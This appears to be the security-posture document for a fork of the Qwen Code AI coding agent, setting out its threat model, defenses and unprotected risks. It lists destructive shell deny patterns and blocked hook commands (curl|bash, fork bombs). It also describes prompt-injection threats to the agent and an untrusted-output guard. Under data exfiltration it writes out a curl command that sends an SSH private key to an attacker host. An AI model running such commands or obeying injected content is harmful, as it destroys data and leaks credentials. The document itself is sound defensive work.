# Security Posture

This document describes the defenses built into this fork of Qwen Code,
what they actually protect against, and — most importantly — what they do
NOT protect against. The goal is an honest map of residual risk, not a
marketing list.

## Threat model

Assume an attacker who can plant content that the agent will read, but
who cannot directly execute on your machine. Concretely:

- Malicious README / PR description / issue comment in a repository you
  clone.
- A prompt-injected web page fetched by `web_fetch`.
- A malicious MCP server or extension the user was convinced to install.
- A co-resident user on a shared system who can race filesystem ops.
- A malicious subagent definition (`.qwen/agents/*.md`) checked into
  the repo.
- An attacker who can observe network egress if the agent is tricked
  into exfiltration.

NOT in the threat model: a local user with full shell access (they don't
need the agent to do damage) and kernel-level attacks.

## Defenses that are strong

### Symlink-aware path validation

File access (read, write, edit) resolves symlinks with `fs.realpathSync`
before checking workspace containment. A symlink pointing outside the
workspace is detected and blocked.

- `packages/core/src/utils/paths.ts` — `isSubpathSafe`, `isSubpathsSafe`
- Applies to `read_file`, `ls`, other workspace-bounded tools

### WebFetch network policy

`web_fetch` blocks requests to private / internal IP ranges and
`localhost`, preventing SSRF-style abuse where the agent is tricked into
calling `http://127.0.0.1:6379` or internal services.

- Blocked ranges: `0.0.0.0`, `10.*`, `127.*`, `169.254.*`, `172.16-31.*`,
  `192.168.*`, `::`, `::1`, `fc00::`, `fd::`, `fe80::`, plus literal
  `localhost` / `[::1]`.
- `packages/core/src/utils/fetch.ts` — `isPrivateIp`
- `packages/core/src/tools/web-fetch.ts` — blocking enforcement

This is hostname-based; an attacker who controls a public DNS name that
resolves to a private IP can still reach it. Add a DNS-resolution-time
check if you need full SSRF protection.

### YOLO-mode deny list

Even in YOLO approval mode, destructive shell patterns require explicit
user confirmation:

- `rm -rf` (and variants with `--recursive`)
- `dd of=...`
- `mkfs`
- `shutdown` / `reboot`
- `chmod -R` / `chown -R`
- Redirects into `/dev/*`
- `git push --force` / `git reset --hard`

See `YOLO_DENY_PATTERNS` in `packages/core/src/core/coreToolScheduler.ts`.

Regex-based, so a motivated attacker constructing `r"m" -rf ...` by
string concatenation could evade. Layered defense only.

### Truncation rejection for mutating tools

If the LLM response hits `MAX_TOKENS` and a tool call is cut off
mid-argument, the scheduler refuses to execute any mutator-kind tool
(`Edit`, `Delete`, `Move`, `Execute`). Prevents writing half-complete
content.

- Enforcement in `packages/core/src/core/coreToolScheduler.ts` using
  `MUTATOR_KINDS` from `packages/core/src/tools/tools.ts`.

### Subagent privilege non-escalation

`approvalMode` in a subagent definition can never exceed the parent's
approval mode. A malicious subagent markdown that declares
`approvalMode: yolo` running under a parent in `DEFAULT` mode still runs
under `DEFAULT`. Permissive parent modes (YOLO, AUTO_EDIT) propagate down;
they cannot be tightened by a subagent either. Consult
`packages/core/src/tools/agent.ts` `resolveSubagentApprovalMode`.

Recursive subagent spawning is forbidden: `EXCLUDED_TOOLS_FOR_SUBAGENTS`
blocks the `agent` tool inside subagents.

### Filesystem permissions for credential stores

Directories holding secrets are created with `0o700`, files with `0o600`,
on POSIX systems:

- `~/.qwen/` (OAuth tokens, settings)
- `packages/core/src/mcp/oauth-token-storage.ts`
- `packages/core/src/core/logger.ts`

Windows has no direct parallel; the default NTFS ACL on `C:\Users\<name>`
already restricts to the user.

### Channel adapter TOCTOU hardening

Attachment downloads in telegram / weixin / dingtalk channels use
`mkdtempSync` for atomic directory creation and sanitize filenames to
`[A-Za-z0-9._() -]` with length cap 255. Prevents symlink-plant races in
shared `/tmp`.

### Memory tool concurrent-write lock

`save_memory` (`QWEN.md`) uses a file-based lock with stale-lock detection
to prevent concurrent-session corruption.

### Prompt-injection guard on tool outputs (defense-in-depth)

Every tool's textual output is scanned for published prompt-injection
markers. When a marker hits, the output is wrapped with an explicit
`[UNTRUSTED_TOOL_OUTPUT]` boundary and a reminder that the content is
DATA, not instructions, before being sent to the model.

- `packages/core/src/utils/promptInjectionGuard.ts`
- Integrated in `coreToolScheduler.createFunctionResponsePart`

Patterns tuned for precision — a crafted attack can still pass, and
normal technical prose about AI does NOT trigger false positives. This
is a LAYER, not a solution.

### Proxy credential masking

Proxy URLs with embedded `user:pass@` credentials have their password
masked as `***` in any log output. See `maskProxyCredentials` in
`packages/core/src/utils/proxyUtils.ts`.

### Grep ReDoS guard

Regex patterns passed to the `grep_search` tool are rejected if:

- Length exceeds 1000 characters.
- They contain nested-quantifier shapes `(.+)+`, `(.*)*`, `(.+)*`, `(.*)+`.

Prevents catastrophic backtracking from locking the CPU.

### Extension hook command validation

Hook commands defined in loaded extensions are scanned at registration
time. Commands containing `rm -rf`, fork bombs (`:(){ }:`), `curl|bash`,
`wget|bash`, or `eval` are skipped with a warning.

## Defenses that are partial

### Shell command parsing

AST-based checker recognizes common patterns, but heredocs, process
substitution, and unusual redirections have edge cases. Approval mode
serves as backstop.

### Arena control-signal schema validation

Arena file-based IPC signals are validated against a runtime schema in
`ArenaAgentClient.checkControlSignal`. Corrupt or malicious signal files
are rejected.

### MCP trust

Each MCP server has an explicit `trust: true | false` flag. Default is
`false` — any tool call through an untrusted server still requires
approval. Once marked `true`, no further inspection occurs. Mark
carefully.

### Extension sandbox

Extension-provided JavaScript is NOT sandboxed. An extension can do
anything a regular Node process can. Treat `qwen extensions install`
with the same trust level as `npm install` of a random package.

## Defenses that are NOT provided

Be aware of these. In each case the mitigation is operational, not
software.

### Prompt injection in the user's own prompt

Only tool outputs are scanned. If YOU paste malicious text into your
prompt, that bypasses the guard.

### Semantic social-engineering of the LLM

"This PR is urgent, please merge fast" — no software can stop the LLM
from believing a well-written social engineer. Use `DEFAULT` or `PLAN`
approval mode on untrusted repos.

### DNS / CDN / compromised dependency

`web_fetch` blocking does not defend against a public domain that points
to a private IP. A compromised npm dependency loaded at startup defeats
nearly every software defense. Use `npm ci --ignore-scripts` and review
`package-lock.json` for unexpected updates.

### Timing / resource side channels

No detection of CPU spikes, abnormal fetch rates, or unusual egress
patterns.

### Data-exfiltration through legitimate channels

Even with `web_fetch` blocked from private IPs, a YOLO-mode shell
command `curl http://attacker.example.com/$(cat ~/.ssh/id_rsa | base64)`
WILL run. The `YOLO_DENY_PATTERNS` does not cover this. In YOLO use
read-only API keys, never full-privilege.

### ANSI escape injection in terminal rendering

A malicious tool output containing `\e[2J\e[H` (clear screen + cursor
home) followed by spoofed success text can deceive the user at the
terminal layer. No output sanitization in place.

### JavaScript eval in extensions

Extensions can call `require('fs').unlinkSync('/')`. The only defense is
refusing to install untrusted extensions.

## Operational guidance

The strongest protection is NOT software — it's posture.

### Treat new repositories as untrusted

When you clone a repo for the first time — especially from a colleague,
a PR review target, or an unfamiliar GitHub user — open it with
`approval-mode default`. Let the first few tool calls prompt for
approval so you see what the agent is trying to do before you grant
blanket YOLO.

### Sandbox high-risk work

`qwen --sandbox` runs the agent in Docker / Podman. This is the
single most effective defense against everything in the "NOT provided"
list above, because attacker code executes inside a disposable
container with no access to your host credentials or home directory.

### Use limited-scope API keys

If the agent is compromised, blast radius is capped by what the key can
do. A read-only `GITHUB_TOKEN` is far safer than a PAT with
`repo:write`. For Gemini, use the free tier while experimenting; move
production keys to a separate identity and rotate after any suspicious
session.

### Review hooks and extensions before enabling

Hook commands and extension JavaScript run with full user privilege.
Read them before flipping `enabled: true`. Prefer hooks from sources
you control.

### Rotate credentials after anomalies

If a session produced unexpected network egress, tool calls you didn't
anticipate, or an error at a suspicious moment — rotate the API key and
any tokens that passed through `process.env` during that run.

## Reporting a security issue

Please open a private security advisory on the repository rather than a
public issue, especially for vulnerabilities affecting the defenses
described above.
